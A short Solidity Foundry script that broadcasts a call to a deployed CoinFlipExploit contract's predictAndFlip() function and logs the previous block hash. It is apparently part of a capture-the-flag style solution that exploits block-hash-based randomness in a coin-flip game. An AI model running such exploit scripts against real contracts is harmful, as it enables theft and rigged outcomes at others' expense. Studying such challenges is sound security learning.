// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/CoinFlipExploit.sol";

contract ExecuteExploitScript is Script {
    address private exploitAddress = 0x1c85638e118b37167e9298c2268758e058DdfDA0;
    CoinFlipExploit exploitContract = CoinFlipExploit(exploitAddress);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        uint256 blockNumber = block.number - 1;
        console.logBytes32(blockhash(blockNumber));
        console.log("_____________");

        exploitContract.predictAndFlip();

        console.log("Done!");

        vm.stopBroadcast();
    }
}
